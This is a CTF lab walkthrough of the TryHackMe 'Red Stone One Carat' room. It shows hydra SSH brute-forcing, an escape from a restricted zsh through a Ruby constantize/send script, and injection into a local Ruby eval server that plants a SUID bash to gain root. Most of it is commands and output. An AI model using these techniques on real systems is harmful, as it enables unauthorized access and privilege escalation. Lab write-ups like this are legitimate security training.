# Red Stone One Carat

## TASK 1
Rooms of the **Red Stone** series share the same goals:

-   Discovering and learning [Ruby](https://www.ruby-lang.org/)  
    
-   Scripting and hacking with [Ruby](https://www.ruby-lang.org/)  
    
-   Exploiting and identifying vulnerabilities in [Ruby](https://www.ruby-lang.org/) programs

I'll give you a valuable source to find stuff related to Offensive Security using Ruby: [https://rubyfu.net/](https://rubyfu.net/).

**Disclaimer**: this room requires custom exploitation and scripting and is more CTF-like than real life applicable.

## TASK 2

Brute-force ssh with given hint
-  HINT : The password contains "bu".
```bash
root@ip-10-10-250-253:~# grep "bu" /usr/share/wordlists/rockyou.txt > dict.txt
root@ip-10-10-250-253:~# hydra -l noraj -P dict.txt 10.10.93.200 ssh
```

SSH to machine with the password

```bash
root@ip-10-10-250-253:~# ssh noraj@10.10.93.200
The authenticity of host '10.10.93.200 (10.10.93.200)' can't be established.
ECDSA key fingerprint is SHA256:SuMSHpQhKSw7AAbZmXq3aY/GOitfbGFUiIg2cTZFfOc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.93.200' (ECDSA) to the list of known hosts.
noraj@10.10.93.200's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

red-stone-one-carat% 
```

Looks like it is a restricted shell. If you don't know what it is,Click [HERE](https://en.wikipedia.org/wiki/Restricted_shell)
But there is a alias for which command and we can use **whence** instead of which in this situation and find some commands.

```bash
red-stone-one-carat% echo $SHELL
/bin/rzsh
red-stone-one-carat% alias
which-command=whence
red-stone-one-carat% whence pwd
pwd
red-stone-one-carat% whence cat
red-stone-one-carat% whence ls
red-stone-one-carat% whence echo
echo
red-stone-one-carat% whence cd
cd
```
So there are some commands available like **echo, cd, pwd**.

list of files with echo command

```bash
red-stone-one-carat% echo *
bin user.txt
red-stone-one-carat% echo ./.*
./.cache ./.hint.txt ./.zcompdump ./.zshrc 
```

cat **user.txt** with echo command:
```bash
red-stone-one-carat% echo "$(<user.txt)"
THM{REDACTED}
```

### Privilege Escalation part:
**.hint.txt**
```bash
red-stone-one-carat% echo "$(<.hint.txt)"
Maybe take a look at local services.
```

Looks like we can't use cd right now :)
```bash
red-stone-one-carat% cd bin 
cd: restricted
red-stone-one-carat% cd ./bin
cd: restricted
red-stone-one-carat% cd ..
cd: restricted
red-stone-one-carat% cd ././bin
cd: restricted
red-stone-one-carat% cd ../
cd: restricted
```

There is another user but no usage for us.
```bash
red-stone-one-carat% echo /home/*
/home/noraj /home/vagrant
red-stone-one-carat% echo /home/vagrant/*
zsh: no matches found: /home/vagrant/*
red-stone-one-carat% echo /home/vagrant/.*
/home/vagrant/.bash_history /home/vagrant/.bash_logout /home/vagrant/.bashrc /home/vagrant/.cache /home/vagrant/.gnupg /home/vagrant/.profile /home/vagrant/.ssh
red-stone-one-carat% echo /home/vagrant/.ssh/*
zsh: no matches found: /home/vagrant/.ssh/*
```

What is in **bin** directory?
```bash
red-stone-one-carat% echo bin/*
bin/test.rb
red-stone-one-carat% echo /.*
zsh: no matches found: /.*
red-stone-one-carat% echo "$(<bin/test.rb)"
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
    klass = ARGV[0].constantize
    obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
    puts File.read(__FILE__)
end
```
#### Read and reasearch for methods (constantize and send()) in the file.

We can run system commands!
```bash
red-stone-one-carat% test.rb Kernel 'system' "/bin/sh"
$ alias
$ which cat
/bin/sh: 2: which: not found
```
So in this way commands are not restricted but they are missing.Now we will import PATHs.

```bash
$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ echo $PATH 
/home/noraj/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ which cat
$ which which 
/usr/bin/which
$ which ruby
/usr/bin/ruby
```
We don't have commands to see local services so maybe we can see local services like netstat in another way ...

In our local machine, we copy [Netstat in Ruby](https://gist.github.com/kwilczynski/954046) and using scp we send that to the target.

```bash
root@ip-10-10-250-253:~# cat net.rb 
!#/usr/bin/env ruby

PROC\_NET\_TCP = '/proc/net/tcp'  # This should always be the same ...

TCP\_STATES = { '00' => 'UNKNOWN',  # Bad state ... Impossible to achieve ...
               'FF' => 'UNKNOWN',  # Bad state ... Impossible to achieve ...
               '01' => 'ESTABLISHED',
               '02' => 'SYN\_SENT',
               '03' => 'SYN\_RECV',
               '04' => 'FIN\_WAIT1',
               '05' => 'FIN\_WAIT2',
               '06' => 'TIME\_WAIT',
               '07' => 'CLOSE',
               '08' => 'CLOSE\_WAIT',
               '09' => 'LAST\_ACK',
               '0A' => 'LISTEN',
               '0B' => 'CLOSING' } # Not a valid state ...

if $0 == \_\_FILE\_\_

  STDOUT.sync = true
  STDERR.sync = true

  File.open(PROC\_NET\_TCP).each do |i|

    i = i.strip

    next unless i.match(/^\\d+/)

    i = i.split(' ')

    local, remote, state = i.values\_at(1, 2, 3)

    local\_IP, local\_port   = local.split(':').collect { |i| i.to\_i(16) }
    remote\_IP, remote\_port = remote.split(':').collect { |i| i.to\_i(16) }

    connection\_state = TCP\_STATES.fetch(state)

    local\_IP  = \[local\_IP\].pack('N').unpack('C4').reverse.join('.')
    remote\_IP = \[remote\_IP\].pack('N').unpack('C4').reverse.join('.')

      puts "#{local\_IP}:#{local\_port} " +
        "#{remote\_IP}:#{remote\_port} #{connection\_state}"
  end

  exit(0)
end

root@ip-10-10-250-253:~# scp net.rb noraj@10.10.93.200:
noraj@10.10.93.200's password: 
net.rb                                    100% 1335     1.9MB/s   00:00  
```

Now in the target machine, We run the file using absolute path of ruby command:
```bash
$ echo *        
bin net.rb user.txt

$ /usr/bin/ruby net.rb
127.0.0.53:53 0.0.0.0:0 LISTEN
0.0.0.0:22 0.0.0.0:0 LISTEN
127.0.0.1:31547 0.0.0.0:0 LISTEN
10.10.93.200:22 10.10.250.253:51502 ESTABLISHED

```
There is a port (31547) in Listening mode.

```bash
$ nc 127.0.0.1 31547
$ echo $SHELL
undefined method `echo' for main:Object
$ ls
undefined local variable or method `ls' for main:Object
```
As I guess, it is another ruby file that we're trapped in it. By some researching, you will end up with this payload that copies /bin/bash to /tmp/bash and adds suid for it.
```bash
$ exec %q!cp /bin/bash /tmp/bash; chmod +s /tmp/bash!
$ ls   
bin  net.rb  user.txt
$ id      
uid=1001(noraj) gid=1001(noraj) groups=1001(noraj)
$ sudo -l
[sudo] password for noraj: 
Sorry, user noraj may not run sudo on red-stone-one-carat.
```
We are in a better shell now :)
but let's jump into the shell we copy in /tmp
```bash
$ ls /tmp
bash
systemd-private-5b2a6cae3b3a419ab62d2b0d84e7afc6-haveged.service-FyDjGr
systemd-private-5b2a6cae3b3a419ab62d2b0d84e7afc6-systemd-resolved.service-367yI0
$ ls -la /tmp/bash
-rwsr-sr-x 1 root root 1113504 May 13 14:06 /tmp/bash
$ /tmp/bash -p
bash-4.4# id
uid=1001(noraj) gid=1001(noraj) euid=0(root) egid=0(root) groups=0(root),1001(noraj)
bash-4.4# 
```

**root.txt**
```bash
bash-4.4# ls /root
root.txt  server.rb
bash-4.4# cat /root/root.txt
THM{REDACTED}
```

If you want to see source of the second ruby file:
```bash
bash-4.4# cat /root/server.rb
require 'socket'

server = TCPServer.new 'localhost', 31547

begin
  while client = server.accept
    client.print '$ '
    while line = client.gets
      if /[\`\(\)\[\]\.\'\"\<\>]+/.match?(line)
        client.puts 'Forbidden character'
      elsif /exit/i.match?(line)
        break
      else
        begin
          client.puts eval(line)
        rescue NameError => e
          client.puts e
        end
      end
      client.print '$ '
    end
    client.puts "Closing the client. Bye!\n"
    client.close
    #server.close
  end
rescue Errno::ECONNRESET, Errno::EPIPE => e
  puts e.message
  retry
end
```
